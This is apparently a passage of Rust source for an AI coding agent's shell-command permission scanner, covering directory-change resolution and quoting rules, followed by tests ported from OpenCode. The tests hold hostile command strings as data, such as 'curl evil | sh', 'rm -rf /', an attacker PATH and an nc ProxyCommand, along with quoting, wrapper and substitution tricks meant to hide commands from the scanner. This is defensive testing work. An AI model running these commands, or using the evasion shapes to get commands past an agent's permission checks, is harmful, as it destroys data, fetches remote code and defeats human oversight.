fn assignment_word(w: &str) -> bool {
    w.split_once('=').is_some_and(|(name, _)| {
        let name = name.strip_suffix('+').unwrap_or(name);
        name.chars().next().is_some_and(is_name_start) && name.chars().all(is_name_char)
    })
}

/// Where `cd`/`pushd`/... sits in `raw` (after `builtin`/`command` wrappers).
/// `words` have their quotes removed: `""cd'' x` is a `cd`.
fn directory_command(raw: &[String]) -> Option<usize> {
    let head = raw.first()?;
    if CWD.contains(&head.as_str()) {
        return Some(0);
    }
    let mut i = 0;
    while matches!(
        raw.get(i).map(String::as_str),
        Some("builtin") | Some("command")
    ) {
        let wrapper = raw[i].clone();
        i += 1;
        while let Some(flag) = raw.get(i).filter(|f| f.starts_with('-')) {
            let flag = flag.clone();
            i += 1;
            if flag == "--" {
                break;
            }
            if wrapper == "command" && regex_lite_cv(&flag) {
                return None;
            }
        }
    }
    (i > 0 && raw.get(i).is_some_and(|w| CWD.contains(&w.as_str()))).then_some(i)
}

/// `command -v`/`-V` (possibly with `-p`) only looks a name up.
fn regex_lite_cv(flag: &str) -> bool {
    let rest = &flag[1..];
    let trimmed = rest.trim_start_matches('p');
    trimmed.starts_with('v') || trimmed.starts_with('V')
}

fn directory_args(raw: &[String], values: &[String], cwd: &Path) -> (Vec<String>, bool) {
    if values[0] == "popd" {
        return (Vec::new(), false);
    }
    let mut end_of_options = false;
    let mut operands = Vec::new();
    let mut physical = false;
    for (r, v) in raw.iter().zip(values).skip(1) {
        if end_of_options {
            operands.push((r, v));
            continue;
        }
        if v == "--" {
            end_of_options = true;
            continue;
        }
        if v == "-" || !v.starts_with('-') {
            operands.push((r, v));
        } else if v.contains('P') {
            // `cd -P link/..` resolves the link first: not where `..` says.
            physical = true;
        }
    }
    if operands.is_empty() {
        // Bare `cd` goes home; bare `pushd` swaps with the stack top.
        return if values[0] == "pushd" {
            (Vec::new(), false)
        } else {
            (vec![home().display().to_string()], !physical)
        };
    }
    if operands.len() > 1 || physical {
        // Zsh's `cd old new` substitutes in `$PWD`.
        let dirs = operands
            .iter()
            .filter(|(r, _)| is_static_word(r))
            .filter_map(|(r, v)| expand_known_directory(v, cwd, tilde_prefix(r, v)))
            .collect();
        return (dirs, false);
    }
    let resolved: Vec<Option<String>> = operands
        .iter()
        .map(|(r, v)| {
            if v.as_str() == "-" || !is_static_word(r) {
                None
            } else {
                expand_known_directory(v, cwd, tilde_prefix(r, v))
            }
        })
        .collect();
    let complete = resolved.iter().all(Option::is_some);
    let mut resolved = resolved;
    for (r, v) in &operands {
        let literal = Some(v.to_string());
        if is_static_word(r)
            && v.starts_with('~')
            && !plain_tilde(r)
            && !resolved.contains(&literal)
        {
            // `cd ""~`: home in Zsh, `./~` in Bash.
            resolved.push(literal);
        }
    }
    (resolved.into_iter().flatten().collect(), complete)
}

fn home() -> PathBuf {
    dirs::home_dir().unwrap_or_default()
}

/// Whether a word's leading `~` is expanded: unquoted, or after quotes that
/// remove to nothing, which Zsh removes first (`""~/x` is `$HOME/x` there).
fn tilde_prefix(raw: &str, value: &str) -> bool {
    strip_empty_quotes(raw).starts_with('~') && value.starts_with('~')
}

/// Whether `raw` starts with a tilde prefix every shell expands: `~` and a
/// name or `+`/`-`, unquoted, up to the first `/`. Bash leaves `~''x`
/// alone; Zsh expands it.
fn plain_tilde(raw: &str) -> bool {
    raw.starts_with('~')
        && !raw
            .split('/')
            .next()
            .unwrap_or("")
            .contains(['\'', '"', '\\', '$', '`'])
}

/// `raw` without leading `''`/`""` pairs, which Zsh removes before it
/// expands a leading `~` or `=`.
fn strip_empty_quotes(raw: &str) -> &str {
    let mut r = raw;
    while let Some(rest) = r.strip_prefix("''").or_else(|| r.strip_prefix("\"\"")) {
        r = rest;
    }
    r
}

fn expand_known_directory(value: &str, cwd: &Path, unquoted_tilde: bool) -> Option<String> {
    if value == "~" {
        return Some(home().display().to_string());
    }
    if let Some(rest) = value.strip_prefix("~/") {
        // `~//x` is `$HOME/x`, not `/x`.
        return Some(
            home()
                .join(rest.trim_start_matches('/'))
                .display()
                .to_string(),
        );
    }
    if unquoted_tilde {
        if value == "~+" {
            return Some(cwd.display().to_string());
        }
        if let Some(rest) = value.strip_prefix("~+/") {
            return Some(cwd.join(rest.trim_start_matches('/')).display().to_string());
        }
        let body = &value[1..];
        let name_end = body.find('/').unwrap_or(body.len());
        let name = &body[..name_end];
        if name.is_empty() {
            return Some(value.to_string());
        }
        let dir_stack = name.starts_with(['+', '-'])
            && name[1..].chars().all(|c| c.is_ascii_digit())
            || name.chars().all(|c| c.is_ascii_digit());
        if dir_stack {
            return None;
        }
        let user = name.chars().next().is_some_and(is_name_start)
            && name
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || "._-".contains(c));
        if user {
            let home = user_home(name)?;
            let rest = body[name_end..].trim_start_matches('/');
            return Some(if rest.is_empty() {
                home.display().to_string()
            } else {
                home.join(rest).display().to_string()
            });
        }
    }
    Some(value.to_string())
}

fn user_home(user: &str) -> Option<PathBuf> {
    if std::env::var("USER").ok().as_deref() == Some(user) {
        return dirs::home_dir();
    }
    if let Ok(passwd) = std::fs::read_to_string("/etc/passwd") {
        for line in passwd.lines() {
            if line.starts_with('#') {
                continue;
            }
            let fields: Vec<&str> = line.split(':').collect();
            if fields.len() > 5 && fields[0] == user && !fields[5].is_empty() {
                return Some(PathBuf::from(fields[5]));
            }
        }
    }
    if cfg!(target_os = "macos") {
        let candidate = Path::new("/Users").join(user);
        if candidate.is_dir() {
            return Some(candidate);
        }
    }
    None
}

/// Whether `raw` names one fixed path: no expansions, no brace expansion, and
/// no unquoted glob in a path segment that starts with a dot (which could
/// match `..`). Ported from OpenCode's `isStaticBashWord`.
fn is_static_word(raw: &str) -> bool {
    #[derive(Default)]
    struct Segments {
        started: bool,
        dot: bool,
        glob: bool,
        ansi_escape: bool,
        unquoted_glob: bool,
    }
    impl Segments {
        fn record(&mut self, c: char, glob: bool) -> bool {
            if glob {
                self.unquoted_glob = true;
            }
            if self.ansi_escape && self.unquoted_glob {
                return false;
            }
            if c == '/' {
                self.started = false;
                self.dot = false;
                self.glob = false;
                return true;
            }
            if !self.started {
                self.started = true;
                self.dot = c == '.';
            }
            if glob {
                self.glob = true;
            }
            !(self.dot && self.glob)
        }
    }
    #[derive(PartialEq)]
    enum Q {
        None,
        Single,
        Double,
        Ansi,
    }
    let expands = |n: Option<&char>| {
        n.is_some_and(|n| n.is_ascii_alphanumeric() || "_@*#?$!({[-~=^+".contains(*n))
    };
    let chars: Vec<char> = raw.chars().collect();
    let mut seg = Segments::default();
    let mut quote = Q::None;
    let mut braces: Vec<bool> = Vec::new();
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        let next = chars.get(i + 1);
        i += 1;
        match quote {
            Q::Single => {
                if c == '\'' {
                    quote = Q::None;
                } else if !seg.record(c, false) {
                    return false;
                }
                continue;
            }
            Q::Ansi => {
                if c == '\\' {
                    seg.ansi_escape = true;
                    if seg.unquoted_glob {
                        return false;
                    }
                    i += 1;
                } else if c == '\'' {
                    quote = Q::None;
                } else if !seg.record(c, false) {
                    return false;
                }
                continue;
            }
            Q::Double => {
                if c == '\\' && next.is_some_and(|n| "$`\"\\\n".contains(*n)) {
                    let n = *next.unwrap();
                    i += 1;
                    if n != '\n' && !seg.record(n, false) {
                        return false;
                    }
                } else if c == '"' {
                    quote = Q::None;
                } else if c == '`' || (c == '$' && expands(next)) || !seg.record(c, false) {
                    return false;
                }
                continue;
            }
            Q::None => {}
        }
        let ok = match c {
            '\\' => {
                i += 1;
                next.is_none_or(|&n| n == '\n' || seg.record(n, false))
            }
            '\'' => {
                quote = Q::Single;
                true
            }
            '"' => {
                quote = Q::Double;
                true
            }
            '$' if next == Some(&'\'') => {
                quote = Q::Ansi;
                i += 1;
                true
            }
            '$' if next == Some(&'"') => {
                quote = Q::Double;
                i += 1;
                true
            }
            '`' => false,
            '<' | '>' | '=' if next == Some(&'(') => false,
            '$' if expands(next) => false,
            '{' => {
                braces.push(false);
                seg.record(c, false)
            }
            '}' if !braces.is_empty() => braces.pop() != Some(true) && seg.record(c, false),
            c => {
                if !braces.is_empty() && (c == ',' || (c == '.' && next == Some(&'.'))) {
                    *braces.last_mut().unwrap() = true;
                }
                seg.record(c, matches!(c, '*' | '?' | '['))
            }
        };
        if !ok {
            return false;
        }
    }
    quote == Q::None
}

#[cfg(test)]
mod tests {
    // ---------------------------------------------------------------------
    // Ported from OpenCode's packages/core/test/shell-scan/scan.test.ts,
    // shell-scan/adversarial.test.ts, shell-scan/redirect.test.ts and
    // shell-parse.test.ts (MIT). `oc_scan_*` cover the scanner,
    // `oc_shell_parse_*` the permission resources derived from it.
    //
    // Intentional differences:
    // - PowerShell cases are not ported: CodeSmith runs `<shell> -c` only.
    // - OpenCode's scanner is a full Bash/Zsh lexer (2,600 lines); this one
    //   covers the common grammar. Exotic forms it does not know are opaque
    //   (refused), never let through: see the module header. The
    //   bounded-time corpus, generated oracle and Zsh-flag suites are not
    //   ported; the bounded-time inputs are checked to finish quickly.
    // - Opaque results carry a reason, but only the reasons asserted by the
    //   OpenCode cases ported here are pinned.
    // ---------------------------------------------------------------------
    use super::*;

    fn cmds(src: &str) -> Vec<Command> {
        scan(src).unwrap_or_else(|r| panic!("{src:?} is opaque: {r}"))
    }

    fn heads(src: &str) -> Vec<String> {
        cmds(src).into_iter().map(|c| c.words[0].clone()).collect()
    }

    fn resources(src: &str) -> Vec<String> {
        cmds(src).into_iter().map(|c| c.resource).collect()
    }

    fn cmd(resource: &str, words: &[&str], raw: &[&str]) -> Command {
        Command {
            resource: resource.into(),
            words: words.iter().map(|s| s.to_string()).collect(),
            raw_words: raw.iter().map(|s| s.to_string()).collect(),
            ..Default::default()
        }
    }

    /// The resources OpenCode's `ShellParse` reports (shadows the full
    /// [`super::Analysis`], whose other fields the CodeSmith tests check).
    #[derive(Debug, PartialEq)]
    struct Analysis {
        commands: Vec<(String, String)>,
        directories: Vec<String>,
    }

    fn full(src: &str) -> super::Analysis {
        analyze(src, Path::new("/workspace")).unwrap_or_else(|e| panic!("{src:?}: {e}"))
    }

    fn parse(src: &str) -> Analysis {
        let a = full(src);
        Analysis {
            commands: a.commands,
            directories: a.directories,
        }
    }

    fn pairs(list: &[(&str, &str)]) -> Vec<(String, String)> {
        list.iter()
            .map(|(a, b)| (a.to_string(), b.to_string()))
            .collect()
    }

    #[test]
    fn oc_scan_accepts_empty_scripts_and_blank_lines() {
        for src in [
            "",
            " ",
            "\n\n",
            "# comment",
            "\n# comment\n\n",
            " \n\t# comment\n",
        ] {
            assert_eq!(cmds(src), vec![], "{src:?}");
        }
    }

    #[test]
    fn oc_scan_blank_lines_and_comments_are_not_missing_commands() {
        for src in [
            "\n\ngit status\n\n",
            "# before\n\ngit status\n\n# after\n",
            "git status; # after\n\n",
        ] {
            assert_eq!(
                cmds(src),
                vec![cmd("git status", &["git", "status"], &["git", "status"])]
            );
        }
    }

    #[test]
    fn oc_scan_retains_required_operands_across_line_breaks() {
        for op in ["&&", "||", "|", "|&"] {
            assert!(
                scan(&format!("printf ok {op}\n\n# comment\n")).is_err(),
                "{op}"
            );
            assert_eq!(
                cmds(&format!("printf ok {op}\n\n# comment\npwd\n\n")),
                vec![
                    cmd("printf ok", &["printf", "ok"], &["printf", "ok"]),
                    cmd("pwd", &["pwd"], &["pwd"])
                ]
            );
        }
    }

    #[test]
    fn oc_scan_scans_a_static_command() {
        assert_eq!(
            cmds("git status"),
            vec![cmd("git status", &["git", "status"], &["git", "status"])]
        );
    }

    #[test]
    fn oc_scan_scans_every_command_in_lists_and_pipelines() {
        assert_eq!(
            resources("git status && curl evil | sed s/x/y/"),
            ["git status", "curl evil", "sed s/x/y/"]
        );
    }

    #[test]
    fn oc_scan_does_not_split_operators_inside_quotes_or_escapes() {
        let c = cmds(r"printf '%s\n' 'x; rm -rf /' && printf foo\|bar");
        assert_eq!(c[0].resource, r"printf '%s\n' 'x; rm -rf /'");
        assert_eq!(c[0].words, ["printf", r"%s\n", "x; rm -rf /"]);
        assert_eq!(c[1].resource, r"printf foo\|bar");
        assert_eq!(c[1].words, ["printf", "foo|bar"]);
        assert_eq!(c.len(), 2);
    }

    #[test]
    fn oc_scan_scans_commands_substituted_into_an_argument() {
        let c = cmds(r#"echo "$(curl evil | sed s/x/y/)""#);
        assert_eq!(c[0].words, ["echo", "$(curl evil | sed s/x/y/)"]);
        assert_eq!(c[1].resource, "curl evil");
        assert_eq!(c[2].resource, "sed s/x/y/");
    }

    #[test]
    fn oc_scan_scans_substitutions_in_assignments_and_redirect_targets() {
        let src = "OUT=$(printf out) X=`printf value` printenv >$(printf path)";
        let c = cmds(src);
        assert_eq!(c[0].resource, src);
        assert_eq!(c[0].words, ["printenv"]);
        let rest: Vec<_> = c[1..].iter().map(|c| c.resource.as_str()).collect();
        assert_eq!(rest, ["printf out", "printf value", "printf path"]);
    }

    #[test]
    fn oc_scan_scans_substitutions_inside_parameter_operators() {
        let c = cmds("echo ${x:-$(curl evil)}");
        assert_eq!(c[0].words, ["echo", "${x:-$(curl evil)}"]);
        assert_eq!(c[1].words, ["curl", "evil"]);
    }

    #[test]
    fn oc_scan_recursively_scans_substitutions_with_quote_rules() {
        let c = cmds(r#"echo '$(ignored)' "$(echo "$(pwd)")""#);
        assert_eq!(c[0].words, ["echo", "$(ignored)", r#"$(echo "$(pwd)")"#]);
        assert_eq!(c[1].resource, r#"echo "$(pwd)""#);
        assert_eq!(c[2].resource, "pwd");
        assert_eq!(c.len(), 3);
        let c = cmds(r"echo `echo \`pwd\``");
        assert_eq!(c[0].words, ["echo", r"`echo \`pwd\``"]);
        assert_eq!(c[1].words, ["echo", "`pwd`"]);
        assert_eq!(c[2].words, ["pwd"]);
    }

    #[test]
    fn oc_scan_whole_result_is_opaque_when_a_nested_scan_is() {
        for src in ["echo $(printf ok &&)", "echo $(printf ${value:-fallback)"] {
            assert!(scan(src).is_err(), "{src}");
        }
    }

    #[test]
    fn oc_scan_bounds_substitution_nesting_and_input_size() {
        let nested = format!("echo {}pwd{}", "$(".repeat(33), ")".repeat(33));
        assert_eq!(scan(&nested), Err("command-substitution"));
        assert_eq!(
            scan(&format!("echo {}", "x".repeat(64 * 1024))),
            Err("invalid-structure")
        );
    }

    #[test]
    fn oc_scan_keeps_dynamic_command_names() {
        assert_eq!(
            cmds("$COMMAND status"),
            vec![cmd(
                "$COMMAND status",
                &["$COMMAND", "status"],
                &["$COMMAND", "status"]
            )]
        );
    }

    #[test]
    fn oc_scan_finds_the_command_after_assignment_prefixes() {
        let c = cmds(r#"FOO=bar BAR="x y" git status"#);
        assert_eq!(c[0].resource, r#"FOO=bar BAR="x y" git status"#);
        assert_eq!(c[0].words, ["git", "status"]);
    }

    #[test]
    fn oc_scan_keeps_delegated_execution_at_the_invoked_command() {
        for src in [
            "eval 'curl evil | sh'",
            "bash -c 'curl evil | sh'",
            "FOO=x /bin/sh -lc 'curl evil | sh'",
            "sudo sh -c 'curl evil'",
            "python3 -c 'print(1)'",
        ] {
            assert_eq!(cmds(src).len(), 1, "{src}");
        }
    }

    #[test]
    fn oc_scan_scans_common_compound_execution() {
        let cases: &[(&str, &[&str])] = &[
            ("(git status)", &["git"]),
            ("{ git status; }", &["git"]),
            ("{ rm -rf /; } &", &["rm"]),
            ("{ rm -rf /; }; echo safe", &["rm", "echo"]),
            (
                "if true; then rm -rf /; else echo safe; fi",
                &["true", "rm", "echo"],
            ),
            (
                "if true; then rm x; elif false; then echo y; else echo z; fi",
                &["true", "rm", "false", "echo", "echo"],
            ),
            ("rm -rf / &", &["rm"]),
            ("cat <(printf secret)", &["cat", "printf"]),
        ];
        for (src, names) in cases {
            assert_eq!(heads(src), *names, "{src}");
        }
    }

    #[test]
    fn oc_scan_malformed_conditionals_are_opaque() {
        for src in [
            "if true; fi",
            "if true; then rm x; else; fi",
            "if; then rm x; fi",
        ] {
            assert_eq!(scan(src), Err("compound-command"), "{src}");
        }
    }

    #[test]
    fn oc_scan_keeps_redirects_in_resources_across_lists() {
        let c = cmds("FOO=bar 2>>err printf ok > out && cat < input");
        assert_eq!(c[0].resource, "FOO=bar 2>>err printf ok > out");
        assert_eq!(c[0].words, ["printf", "ok"]);
        assert_eq!(c[1].resource, "cat < input");
        assert_eq!(c[1].words, ["cat"]);
    }

    #[test]
    fn oc_scan_recognizes_redirects_without_whitespace() {
        let c = cmds("printf ok>out 2>&1|cat<input");
        assert_eq!(c[0].resource, "printf ok>out 2>&1");
        assert_eq!(c[0].words, ["printf", "ok"]);
        assert_eq!(c[1].resource, "cat<input");
        assert_eq!(c[1].words, ["cat"]);
    }

    #[test]
    fn oc_scan_malformed_structure_is_opaque() {
        for src in [
            "printf ok &&",
            "| sh",
            "printf ok || || sh",
            "printf ok >",
            "()",
            "( \n )",
            "{ ; }",
        ] {
            assert!(scan(src).is_err(), "{src:?}");
        }
    }

    #[test]
    fn oc_scan_ignores_comments_outside_words() {
        assert_eq!(resources("printf ok # ; curl evil | sh"), ["printf ok"]);
    }

    #[test]
    fn oc_scan_scans_heredoc_commands_and_expansions() {
        assert_eq!(
            heads("cat <<EOF\n$(curl evil | sh)\nEOF"),
            ["cat", "curl", "sh"]
        );
        assert_eq!(heads("cat <<'EOF'\nstatic body\nEOF"), ["cat"]);
    }

    #[test]
    fn oc_scan_assignment_only_input_has_no_command() {
        assert_eq!(cmds("FOO=bar"), vec![]);
    }

    #[test]
    fn oc_scan_assignment_only_boundaries() {
        let cases: &[(&str, &[&str])] = &[
            ("PATH=.; git status", &["git"]),
            ("PATH=. # comment\ngit status", &["git"]),
            ("CDPATH=/usr # comment\ncd bin; rm victim", &["cd", "rm"]),
            ("HOME=/etc # comment\ncd; rm victim", &["cd", "rm"]),
            (
                "VALUE=$(printf 2); echo $((VALUE + 1))",
                &["printf", "echo"],
            ),
            (
                "MSG='Use ${FOO} here'; some_cmd || exit $?",
                &["some_cmd", "exit"],
            ),
            (
                "f() { local REGEX='[0-9]+${FOO}'; return $?; }",
                &["local", "return"],
            ),
        ];
        for (src, names) in cases {
            assert_eq!(heads(src), *names, "{src}");
        }
    }

    #[test]
    fn oc_scan_parameter_operator_grammar() {
        for src in [
            "echo ${url:-http://example.test}",
            r#"printf '%s' "${PATH//:/$'\n'}""#,
        ] {
            assert!(scan(src).is_ok(), "{src}");
        }
    }

    #[test]
    fn oc_scan_bash_lexical_forms() {
        for src in [
            ":; { touch /tmp/victim; }",
            "{fd}>/tmp/log touch /tmp/victim",
            "time touch /tmp/victim",
            "if true; then echo safe; fi > /tmp/victim",
            "if true; then :; 'if' victim; fi",
        ] {
            assert!(scan(src).is_ok(), "{src}");
        }
        // Deliberate difference: OpenCode scans this and finds `touch`.
        // Bash 3.2 (macOS's /bin/bash) ends the substitution at the `)` in
        // `${x%)}`, so the same shape can hide a command from the modern
        // reading (`"$(echo ${x%)}"; rm x; ": )"` runs `rm x` there): opaque.
        assert!(scan(r#"printf '%s' "$(printf safe ${x%)}; touch /tmp/victim)""#).is_err());
        assert!(scan(r#"echo "$(echo ${x%)}"; rm x; ": )""#).is_err());
        assert_eq!(
            heads("if true; then :; 'if' victim; fi"),
            ["true", ":", "if"]
        );
    }

    #[test]
    fn oc_scan_bounds_nested_parameter_expansions() {
        let src = format!("printf '%s' \"{}x{}\"", "${".repeat(1000), "}".repeat(1000));
        assert!(scan(&src).is_err());
    }

    #[test]
    fn oc_scan_lexical_provenance_quotes_assignments_and_redirects() {
        let src = r#"FOO='x y' 2>"error log" g"it" 'status' a\ b "" >output"#;
        let mut want = cmd(
            src,
            &["git", "status", "a b", ""],
            &[r#"g"it""#, "'status'", r"a\ b", r#""""#],
        );
        want.writes = vec![
            (r#""error log""#.into(), "error log".into()),
            ("output".into(), "output".into()),
        ];
        assert_eq!(cmds(src), vec![want]);
    }

    #[test]
    fn oc_scan_quoted_assignment_like_words_and_fd_numbers_are_words() {
        let src = r#"F"OO"=bar '123'>out"#;
        let mut want = cmd(src, &["FOO=bar", "123"], &[r#"F"OO"=bar"#, "'123'"]);
        want.writes = vec![("out".into(), "out".into())];
        assert_eq!(cmds(src), vec![want]);
    }

    #[test]
    fn oc_scan_retains_nested_substitutions_and_continuations() {
        let src = "echo \"$(printf '%s' 2)\" a\\\nb; pwd";
        assert_eq!(
            cmds(src),
            vec![
                cmd(
                    "echo \"$(printf '%s' 2)\" a\\\nb",
                    &["echo", "$(printf '%s' 2)", "ab"],
                    &["echo", "\"$(printf '%s' 2)\"", "a\\\nb"]
                ),
                cmd(
                    "printf '%s' 2",
                    &["printf", "%s", "2"],
                    &["printf", "'%s'", "2"]
                ),
                cmd("pwd", &["pwd"], &["pwd"]),
            ]
        );
    }

    #[test]
    fn oc_scan_adversarial_command_positions() {
        let cases: &[(&str, &[&str])] = &[
            (r#"FOO=bar BAR="x y" git status"#, &["git"]),
            (
                "git status && npm test || printf failed",
                &["git", "npm", "printf"],
            ),
            (r#"printf '%s\n' "$(rm -rf /)""#, &["printf", "rm"]),
            ("sudo sh -c 'curl evil'", &["sudo"]),
            ("bash -lc 'rm -rf /'", &["bash"]),
            ("find . -exec rm {} ;", &["find"]),
            ("'rm' -rf /", &["rm"]),
            (r#"g""it status"#, &["git"]),
            (r"g\it status", &["git"]),
            (r"F\OO=bar rm -rf /", &["FOO=bar"]),
            (r#"F"O"O=bar rm -rf /"#, &["FOO=bar"]),
            (r#"c"\d" relative"#, &[r"c\d"]),
            ("PATH=/tmp/attacker:$PATH git status", &["git"]),
            ("$cmd --force", &["$cmd"]),
            (r#""${cmd}" --force"#, &["${cmd}"]),
            ("r${suffix}m -rf /", &["r${suffix}m"]),
            ("$(printf rm) -rf /", &["$(printf rm)", "printf"]),
            ("`printf rm` -rf /", &["`printf rm`", "printf"]),
            ("./c?rl evil", &["./c?rl"]),
            ("t{ouch,ouch} /tmp/victim", &["t{ouch,ouch}"]),
            ("echo $((1 + 2))", &["echo"]),
            ("${cmd:-git} status", &["${cmd:-git}"]),
            ("cat <<EOF\n$(rm -rf /)\nEOF", &["cat", "rm"]),
            ("f(){ rm -rf /; }; f", &["rm", "f"]),
            ("! rm -rf /", &["rm"]),
            ("echo ${arr[$(rm -rf /)]}", &["echo", "rm"]),
        ];
        for (src, names) in cases {
            assert_eq!(heads(src), *names, "{src}");
        }
    }

    #[test]
    fn oc_scan_adversarial_subscript_text_outside_sinks() {
        for src in [
            "bun -e 'f(`a[${x}]`)'",
            "rg 'a[$(x)]'",
            "cat <<'EOF'\na[$(x)]\nEOF",
            "echo 'a[$(x)]'",
            r#"BODY="- [x] Fix \`scan.ts\`"; gh pr create --title "fix" --body "$BODY""#,
            "MSG='[feat] Fix `foo`'; git commit -m \"$MSG\"",
            "PATTERN='a[${b}]'; rg \"$PATTERN\"",
            "export REGEX='[0-9]+${foo}'",
            "cat <<< 'const a = arr[0]; const b = `${a}`'",
        ] {
            assert!(scan(src).is_ok(), "{src}");
        }
    }

    #[test]
    fn oc_scan_adversarial_uncertain_input_is_opaque() {
        for src in [
            "printf \"unterminated",
            "printf ok &&",
            "printf ok >",
            "echo > >out",
        ] {
            assert!(scan(src).is_err(), "{src}");
        }
    }

    #[test]
    fn oc_scan_adversarial_input_in_bounded_time() {
        let inputs = [
            format!("x[a]{}", "=]".repeat(32_000)),
            "a[\n".repeat(21_000),
            format!("case x in {}", "[$(:)".repeat(10_000)),
            format!(
                "{}echo {}{}",
                "{ ".repeat(31),
                "a[] ".repeat(15_000),
                "; }".repeat(31)
            ),
            format!("cat <<E\n{}E\n", "x\\\n".repeat(20_000)),
            format!("cat <<E\n{}x\nE\n", "\\".repeat(60_000)),
        ];
        for input in inputs {
            let start = std::time::Instant::now();
            let _ = scan(&input);
            assert!(start.elapsed() < std::time::Duration::from_millis(500));
        }
    }

    /// Analyzes `src` and fails unless it finishes within `limit`.
    fn timed(src: &str, limit: std::time::Duration) -> Result<super::Analysis, String> {
        let start = std::time::Instant::now();
        let result = analyze(src, Path::new("/workspace"));
        let took = start.elapsed();
        assert!(
            took < limit,
            "{took:?} for {} chars: {:?}",
            src.len(),
            &src[..src.len().min(80)]
        );
        result
    }

    #[test]
    fn sec_nested_arithmetic_in_bounded_time() {
        // Each level was read both as arithmetic and as Dash's subshells,
        // doubling the work per level: 51 ms at 16 levels, hours at 40.
        let limit = std::time::Duration::from_secs(2);
        let forms = [("$((", "))"), ("$((a[", "]))"), ("$(( (", ") ))")];
        for (open, close) in forms {
            for n in [16, 24, 31] {
                let src = format!("echo {}1{}", open.repeat(n), close.repeat(n));
                timed(&src, limit).unwrap_or_else(|e| panic!("{n} x {open}: {e}"));
            }
            for n in [64, 1000] {
                let src = format!("echo {}1{}", open.repeat(n), close.repeat(n));
                assert!(timed(&src, limit).is_err(), "{n} x {open}");
            }
            // The same, as an arithmetic command and behind a substitution.
            for n in [64, 1000] {
                let src = format!("(({}1{}))", open.repeat(n), close.repeat(n));
                assert!(timed(&src, limit).is_err(), "(( {n} x {open}");
                let src = format!("echo $(: {}1{})", open.repeat(n), close.repeat(n));
                assert!(timed(&src, limit).is_err(), "$( {n} x {open}");
            }
        }
        // Commands inside still count once nesting is collapsed.
        let src = format!("echo {}$(rm -rf x){}", "$((".repeat(20), "))".repeat(20));
        let a = timed(&src, limit).unwrap();
        assert!(has(&a.commands, "rm -rf x"), "{a:?}");
    }

    #[test]
    fn sec_more_wrappers_check_the_wrapped_command() {
        for (src, wrapped) in [
            ("taskset 0x1 rm x", "rm x"),
            ("taskset -c 1,2 rm x", "rm x"),
            ("flock /tmp/l rm x", "rm x"),
            ("flock -n -w 5 l -c 'rm x; touch y'", "touch y"),
            ("lockf -t 3 l rm x", "rm x"),
            ("chroot / rm x", "rm x"),
            ("script -q /dev/null rm x", "rm x"),
            ("script -qc 'rm x' log", "rm x"),
            ("su -c 'rm x' root", "rm x"),
            ("su root -lc 'rm x'", "rm x"),
            ("runuser -u nobody -- rm x", "rm x"),
            ("sudo --user root -E rm x", "rm x"),
            ("sudo -i rm x", "rm x"),
            ("doas -u root rm x", "rm x"),
            ("gtimeout --foreground -s KILL 5 rm x", "rm x"),
            ("stdbuf --output L rm x", "rm x"),
            ("ionice -c 3 rm x", "rm x"),
            ("chrt -f 10 rm x", "rm x"),
            ("setsid -f rm x", "rm x"),
            ("unbuffer rm x", "rm x"),
            ("caffeinate -t 10 rm x", "rm x"),
            ("arch -arch x86_64 rm x", "rm x"),
            ("busybox rm x", "rm x"),
            ("watch -n 1 'rm x | cat'", "rm x"),
            ("watch -d rm x", "rm x"),
            ("watch -x rm x", "rm x"),
            ("parallel -j 2 rm ::: a b", "rm"),
            ("nix-shell --run 'rm x'", "rm x"),
            ("nix develop -c rm x", "rm x"),
            ("entr -s 'rm x'", "rm x"),
            ("ssh host rm x", "rm x"),
            ("ssh -p 22 host -o ProxyCommand='nc %h %p' ls", "nc %h %p"),
            ("scp -S rmprog a host:b", "rmprog"),
            ("rsync -avze 'ssh -p 2' a host:b", "ssh -p 2"),
        ] {
            let a = full(src);
            assert!(has(&a.delegated, wrapped), "{src}: {:?}", a.delegated);
            assert_eq!(a.dynamic, None, "{src}");
        }
        // No command runs.
        for src in [
            "taskset -p 1 123",
            "ionice -p 123",
            "chrt -p 123",
            "sudo -l rm x",
        ] {
            let a = full(src);
            assert!(a.delegated.is_empty(), "{src}: {:?}", a.delegated);
            assert_eq!(a.dynamic, None, "{src}");
        }
        // A shell reading its input, or options the scan cannot read.
        for src in [
            "chroot /",
            "su - root",
            "sudo -s",
            "doas -s",
            "parallel ::: 'rm a'",
            "parallel '{}' ::: rm",
            "parallel --frob rm ::: a",
            "at now",
            "tmux new-session -d 'rm x'",
            "ssh -T git@github.com",
            "flock l -c \"$x\"",
        ] {
            assert!(full(src).dynamic.is_some(), "{src}");
        }
        // Lock files and typescripts are writes; `ssh`'s remote `cd` is not
        // a local directory.
        let paths = |src: &str| -> Vec<Option<String>> {
            full(src).writes.into_iter().map(|w| w.path).collect()
        };
        assert_eq!(paths("flock l rm x"), [Some("l".to_string())]);
        assert_eq!(paths("script -qc 'rm x'"), [Some("typescript".to_string())]);
        assert!(full("ssh host 'cd /etc && rm x'").directories.is_empty());
    }

    #[test]
    fn sec_inline_code_is_checked_as_a_marker() {
        for (src, marker) in [
            ("python3 -c 'print(1)'", "code:python3 print(1)"),
            ("python3 -Ic 'print(1)'", "code:python3 print(1)"),
            ("python3 <<'EOF'\nprint(1)\nEOF", "code:python3 -"),
            ("perl -pi -e 's/a/b/' f", "code:perl s/a/b/"),
            ("perl -lne 'print' f", "code:perl print"),
            ("ruby -rjson -e 'p 1'", "code:ruby p 1"),
            ("node -pe 1", "code:node 1"),
            ("node --eval=x", "code:node x"),
            (
                "osascript -e 'do shell script \"rm x\"'",
                "code:osascript do shell script \"rm x\"",
            ),
            ("deno eval x", "code:deno x"),
            ("php -r x", "code:php x"),
            ("awk '{system($0)}'", "code:awk {system($0)}"),
            ("awk \"{print $x}\" f", "code:awk {print $x}"),
            ("sed -e 's/x/y/e' f", "code:sed -e s/x/y/e f"),
            ("sed \"s/$a/b/\" f", "code:sed s/$a/b/ f"),
        ] {
            let a = full(src);
            assert!(has(&a.delegated, marker), "{src}: {:?}", a.delegated);
            let save = a.delegated.iter().find(|(r, _)| r == marker).unwrap();
            assert!(
                save.1.starts_with("code:") && save.1.ends_with(" *"),
                "{save:?}"
            );
        }
        // Script files, modules and plain text programs are no marker.
        for src in [
            "python3 script.py",
            "python3 -m pytest",
            "python3 --version",
            "perl script.pl",
            "node app.js",
            "php -S localhost:8000",
            "awk '{print $1}' f",
            "awk '$3 > 100 {print $1}' f",
            "awk '/a|b/ {print}' f",
            "awk -f prog.awk f",
            "sed 's/a/b/g' f",
